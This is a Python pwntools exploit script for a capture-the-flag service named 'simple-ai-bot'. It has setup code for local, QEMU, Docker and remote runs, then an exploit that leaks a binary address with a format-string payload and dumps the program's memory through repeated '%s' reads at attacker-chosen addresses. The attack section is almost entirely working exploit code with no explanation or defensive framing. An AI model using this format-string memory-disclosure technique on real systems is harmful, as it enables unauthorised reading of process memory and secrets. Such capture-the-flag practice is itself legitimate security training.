
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
# exe = './chall'
# elf = context.binary = ELF(exe, checksec=True)
# libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "simple-ai-bot.ctf.zone", 4242


gdbscript = '''
init-gef
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if not args.REMOTE and not args.GDB:
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def dump_memory(start_addr, size):
    offset = 6
    data = b""
    addr = start_addr
    while addr < start_addr + size:
        try:
            # Read up to 8 bytes at a time
            if '0a' in hex(addr):
                addr += 1
                data += b'\x00'
            leak("Addr", hex(addr))
            payload = (f"%{offset + 2}$sEND".encode().ljust(16, b"\x00") + p64(addr))
            sla("> ", payload)
            ru(": ")
            chunk = ru("END")
            data += chunk + b"\x00"
            addr += len(chunk) + 1
        except EOFError:
            log.warning(f"EOF at {hex(addr)}")
            log.warning(f"Data collected so far: {len(data)} bytes")
            log.warning(f"Last chunk: {chunk}")
            log.warning(f"Expected size: {size} bytes")
            break

    return data

def exploit():
    global io
    io = initialize()
    sla("> ", b"%97$p")
    ru(": ")
    leak_elf = int(rl().strip(), 16)
    elf_base = leak_elf & ~0xfff
    leak("ELF base", hex(elf_base))
    bin_data = dump_memory(elf_base, 0x2000)
    with open("dump3.bin", "wb") as f:
        f.write(bin_data)
    leak("Dump size", hex(len(bin_data)))

    io.interactive()

    
if __name__ == '__main__':
    exploit()
